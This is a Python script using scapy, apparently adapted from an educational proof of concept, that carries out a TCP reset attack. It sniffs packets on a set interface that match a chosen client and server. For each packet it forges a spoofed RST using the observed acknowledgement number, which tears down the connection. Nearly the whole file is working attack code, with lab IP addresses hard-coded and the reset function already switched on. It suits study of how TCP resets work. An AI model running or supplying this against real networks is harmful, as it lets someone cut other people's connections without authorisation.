#!/usr/bin/python3
from scapy.all import *
import ifaddr
import threading
import random

DEFAULT_WINDOW_SIZE=2052

#############################
# Original Project:
#   https://robertheaton.com/2020/04/27/how-does-a-tcp-reset-attack-work/
#   https://github.com/robert/how-does-a-tcp-reset-attack-work
# TODO: 
#   - Update with options to select targets addresses, ports, and interface
#   - Option to select number of packets to send
#   - Update DEBUG print statements
#   - Capture packets to a PCAP - probably requires second interface
#   - Option for sniff mode and send mode
#   - Move to CutSec_Tools and reference original POC
#############################


# In order for this attack to work on Linux, we must
# use L3RawSocket, which under the hood sets up the socket
# to use the PF_INET "domain". This is required because of the
# way localhost works on Linux.
#
# See https://scapy.readthedocs.io/en/latest/troubleshooting.html#i-can-t-ping-127-0-0-1-scapy-does-not-work-with-127-0-0-1-or-on-the-loopback-interface for more details.
conf.L3socket = L3RawSocket

def log(msg, params={}):
    formatted_params = " ".join([f"{k}={v}" for k, v in params.items()])
    print(f"{msg} {formatted_params}")

def is_adapter_localhost(adapter, localhost_ip):
    return len([ip for ip in adapter.ips if ip.ip == localhost_ip]) > 0

def is_packet_on_tcp_conn(server_ip, server_port, client_ip):
    def f(p):
        return (
            is_packet_tcp_server_to_client(server_ip, server_port, client_ip)(p) or
            is_packet_tcp_client_to_server(server_ip, server_port, client_ip)(p)
        )

    return f


def is_packet_tcp_server_to_client(server_ip, server_port, client_ip):
    def f(p):
        if not p.haslayer(TCP):
            return False

        src_ip = p[IP].src
        src_port = p[TCP].sport
        dst_ip = p[IP].dst

        return src_ip == server_ip and src_port == server_port and dst_ip == client_ip

    return f


def is_packet_tcp_client_to_server(server_ip, server_port, client_ip):
    def f(p):
        if not p.haslayer(TCP):
            return False

        src_ip   = p[IP].src
        dst_ip   = p[IP].dst
        dst_port = p[TCP].dport

        print('Client Server Test - Params: %s:%s %s'%(server_ip,server_port,client_ip))
        print('Client Server Test - Packet: %s:%s %s'%(dst_ip,dst_port,src_ip))
        print('Client Server Test - Result bits: %s:%s:%s'%(src_ip == client_ip , dst_ip == server_ip , dst_port == server_port))
        result = src_ip == client_ip and dst_ip == server_ip and dst_port == server_port
        print('Client Server Test - Result: %s'%(result))
        return result

        #print('Client Server Test - Result: %s'%(src_ip == client_ip and dst_ip == server_ip and dst_port == server_port))
        #return src_ip == client_ip and dst_ip == server_ip and dst_port == server_port

    return f


def send_reset(iface, seq_jitter=0, ignore_syn=True):
    #"""Set seq_jitter to be non-zero in order to prove to yourself that the
    #sequence number of a RST segment does indeed need to be exactly equal
    #to the last sequence number ACK-ed by the receiver"""
    def f(p):
        src_ip = p[IP].src
        src_port = p[TCP].sport
        dst_ip = p[IP].dst
        dst_port = p[TCP].dport
        seq = p[TCP].seq
        ack = p[TCP].ack
        flags = p[TCP].flags

        log(
            "Grabbed packet",
            {
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "src_port": src_port,
                "dst_port": dst_port,
                "seq": seq,
                "ack": ack
            }
        )

        if "S" in flags and ignore_syn:
            print("Packet has SYN flag, not sending RST")
            return

        # Don't allow a -ve seq
        jitter = random.randint(max(-seq_jitter, -seq), seq_jitter)
        if jitter == 0:
            print("jitter == 0, this RST packet should close the connection")

        rst_seq = ack + jitter
        p = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags="R", window=DEFAULT_WINDOW_SIZE, seq=rst_seq)

        log(
            "Sending RST packet...",
            {
                "orig_ack": ack,
                "jitter": jitter,
                "seq": rst_seq    
            }
        )

        send(p, verbose=0, iface=iface)

    return f


def log_packet(p):
    #"""This prints a big pile of debug information. We could make a prettier
    #log function if we wanted."""
    return p.show()


if __name__ == "__main__":
    ###################
    # TODO: Remove old setup code
    ###################
    #localhost_ip = "127.0.0.1"
    #local_ifaces = [
        #adapter.name for adapter in ifaddr.get_adapters()
        #if is_adapter_localhost(adapter, localhost_ip)
    #]
    #iface = local_ifaces[0]
    #localhost_server_port = 8000
    
    #Test config
    client_ip   = "192.168.1.13"
    server_ip   = "192.168.1.1"
    server_port = 10000
    iface       = "eth2"

    log("Starting sniff...")
    t = sniff(
        iface=iface,
        count=50,
        # NOTE: uncomment `send_reset` to run the reset attack instead of
        # simply logging the packet.
        prn=send_reset(iface),
        #prn=log_packet,
        #lfilter=is_packet_tcp_client_to_server(localhost_ip, localhost_server_port, localhost_ip))
        lfilter=is_packet_tcp_client_to_server(server_ip, server_port, client_ip)
        )
    log("Finished sniffing!")
